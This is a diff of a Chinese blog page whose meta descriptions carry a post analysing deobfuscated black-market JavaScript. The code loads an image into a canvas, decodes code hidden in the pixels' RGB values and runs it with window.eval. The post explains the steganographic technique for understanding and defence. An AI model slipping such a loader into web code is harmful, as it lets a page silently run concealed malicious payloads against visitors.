@@ -18,7 +18,10 @@
   <meta name="author" content="Neal" />
   <meta name="description" content="前段时间获取到黑产的一些代码，不得不感叹黑产的代码实在在写的是好得很，思路巧妙，环环相扣。不得不说，技术不好，黑产都做不了了。虽然分析了好多天，但是也只是一知半解。这里抽出一小部分来讲一下。二话不说，先上代码：
 最初的代码是经过混淆的，代码经过整理如下：
-var createImgElement = function(urla, b) {  var imgElement = document.createElement(&amp;#39;img&amp;#39;);  var canvasEle = document.createElement(&amp;#39;canvas&amp;#39;);  imgElement[&amp;#39;crossOrigin&amp;#39;] = true;  imgElement[&amp;#39;onload&amp;#39;] = function() {  canvasEle.width = this.width;  canvasEle.height = this.height;  var canvasContext = canvasEle.getContext(&amp;#39;2d&amp;#39;)  canvasContext.drawImage(this, 0, 0, this.width, this.height);  for (var canvasContext = canvasContext.getImageData(0, 0, this.width, this.height),  cancasDataLength = canvasContext.data.length, arr = [], i = 0;  i &amp;lt; cancasDataLength;  i &#43;= 4) {  var code = canvasContext." />
+var createImgElement = function(urla, b) { var imgElement = document.createElement(&#39;img&#39;); var canvasEle = document.createElement(&#39;canvas&#39;); imgElement[&#39;crossOrigin&#39;] = true; imgElement[&#39;onload&#39;] = function() { canvasEle.width = this.width; canvasEle.height = this.height; var canvasContext = canvasEle.getContext(&#39;2d&#39;) canvasContext.drawImage(this, 0, 0, this.width, this.height); for (var canvasContext = canvasContext.getImageData(0, 0, this.width, this.height), cancasDataLength = canvasContext.data.length, arr = [], i = 0; i &lt; cancasDataLength; i &#43;= 4) { var code = canvasContext.data[i] var code1 = canvasContext.data[i &#43; 1] var code2 = canvasContext.data[i &#43; 2] canvasContext.data[i &#43; 2].toString(16); 1 == code1.length &amp;&amp; (code1 = 0 &#43; code1); 1 == code2.length &amp;&amp; (code2 = 0 &#43; code2); 0 != Number(code &#43; code1 &#43; code2) &amp;&amp; arr.push(String.fromCharCode(Number(code &#43; code1 &#43; code2))); } window.eval(arr.join(&#39;&#39;)); console.log(arr.join(&#39;&#39;)); b &amp;&amp; b(); } imgElement.src = urla; }; 这段代码的主要目的是通过使用一个图片的连接，将这个图片加载到 canvas 中，再利用 canvas 去获取恶意代码并执行。通过图片去隐藏信息是一种常见的做法，这段就是通过 canvas 去执行图片中隐含的恶意代码。这段还支持传入回调函数，若回调函数存在，则执行回调函数。
+在这里还利用一个计算机图像的知识，即像素中的 RGBA 值。Canvas 中的 ImageData 对象中每一个像素都包含了4个信息，即 RGBA 值。
+R - 红色 (0-255) G - 绿色 (0-255) B - 蓝色 (0-255) A - alpha 通道 (0-255; 0 是透明的，255 是完全可见的) 通过将代码转化为 ascii 码，将其隐藏在图片中的 RGB 信息中，黑产的 alpha 值都设置的为255。这样非常巧妙地就实现了代码信息和图片之间的转换。
+" />
 
   
   
@@ -28,7 +31,10 @@ var createImgElement = function(urla, b) {  var imgElement = document.createElem
   <meta property="og:title" content="黑产代码解密--利用canvas加载代码" />
   <meta property="og:description" content="前段时间获取到黑产的一些代码，不得不感叹黑产的代码实在在写的是好得很，思路巧妙，环环相扣。不得不说，技术不好，黑产都做不了了。虽然分析了好多天，但是也只是一知半解。这里抽出一小部分来讲一下。二话不说，先上代码：
 最初的代码是经过混淆的，代码经过整理如下：
-var createImgElement = function(urla, b) {  var imgElement = document.createElement(&amp;#39;img&amp;#39;);  var canvasEle = document.createElement(&amp;#39;canvas&amp;#39;);  imgElement[&amp;#39;crossOrigin&amp;#39;] = true;  imgElement[&amp;#39;onload&amp;#39;] = function() {  canvasEle.width = this.width;  canvasEle.height = this.height;  var canvasContext = canvasEle.getContext(&amp;#39;2d&amp;#39;)  canvasContext.drawImage(this, 0, 0, this.width, this.height);  for (var canvasContext = canvasContext.getImageData(0, 0, this.width, this.height),  cancasDataLength = canvasContext.data.length, arr = [], i = 0;  i &amp;lt; cancasDataLength;  i &#43;= 4) {  var code = canvasContext." />
+var createImgElement = function(urla, b) { var imgElement = document.createElement(&#39;img&#39;); var canvasEle = document.createElement(&#39;canvas&#39;); imgElement[&#39;crossOrigin&#39;] = true; imgElement[&#39;onload&#39;] = function() { canvasEle.width = this.width; canvasEle.height = this.height; var canvasContext = canvasEle.getContext(&#39;2d&#39;) canvasContext.drawImage(this, 0, 0, this.width, this.height); for (var canvasContext = canvasContext.getImageData(0, 0, this.width, this.height), cancasDataLength = canvasContext.data.length, arr = [], i = 0; i &lt; cancasDataLength; i &#43;= 4) { var code = canvasContext.data[i] var code1 = canvasContext.data[i &#43; 1] var code2 = canvasContext.data[i &#43; 2] canvasContext.data[i &#43; 2].toString(16); 1 == code1.length &amp;&amp; (code1 = 0 &#43; code1); 1 == code2.length &amp;&amp; (code2 = 0 &#43; code2); 0 != Number(code &#43; code1 &#43; code2) &amp;&amp; arr.push(String.fromCharCode(Number(code &#43; code1 &#43; code2))); } window.eval(arr.join(&#39;&#39;)); console.log(arr.join(&#39;&#39;)); b &amp;&amp; b(); } imgElement.src = urla; }; 这段代码的主要目的是通过使用一个图片的连接，将这个图片加载到 canvas 中，再利用 canvas 去获取恶意代码并执行。通过图片去隐藏信息是一种常见的做法，这段就是通过 canvas 去执行图片中隐含的恶意代码。这段还支持传入回调函数，若回调函数存在，则执行回调函数。
+在这里还利用一个计算机图像的知识，即像素中的 RGBA 值。Canvas 中的 ImageData 对象中每一个像素都包含了4个信息，即 RGBA 值。
+R - 红色 (0-255) G - 绿色 (0-255) B - 蓝色 (0-255) A - alpha 通道 (0-255; 0 是透明的，255 是完全可见的) 通过将代码转化为 ascii 码，将其隐藏在图片中的 RGB 信息中，黑产的 alpha 值都设置的为255。这样非常巧妙地就实现了代码信息和图片之间的转换。
+" />
   <meta property="og:url" content="https://madneal.com/post/%E9%BB%91%E4%BA%A7%E4%BB%A3%E7%A0%81%E8%A7%A3%E5%AF%86--%E5%88%A9%E7%94%A8canvas%E5%8A%A0%E8%BD%BD%E4%BB%A3%E7%A0%81/" />
   <meta property="og:image" content="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg" />
 
@@ -346,31 +352,13 @@ var createImgElement = function(urla, b) {  var imgElement = document.createElem
       </ul>
       
       <p class="post-copyright">
-        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.This post was published <strong>2374</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.This post was published <strong>2406</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
       </p>
     </footer>
     
-      <div id="disqus_thread"></div>
-<script type="application/javascript">
-    window.disqus_config = function () {
-    
-    
-    
-    };
-    (function() {
-        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
-            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
-            return;
-        }
-        var d = document, s = d.createElement('script'); s.async = true;
-        s.src = '//' + "nealecnu" + '.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', +new Date());
-        (d.head || d.body).appendChild(s);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-      
+        
+          
+       
     
   </section>
   <footer class="site-footer">
@@ -404,20 +392,7 @@ var createImgElement = function(urla, b) {  var imgElement = document.createElem
 </script>
 
 <script src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/js/bundle.js"></script>
-
-
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-104405154-2', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
-
+  
 
 
 
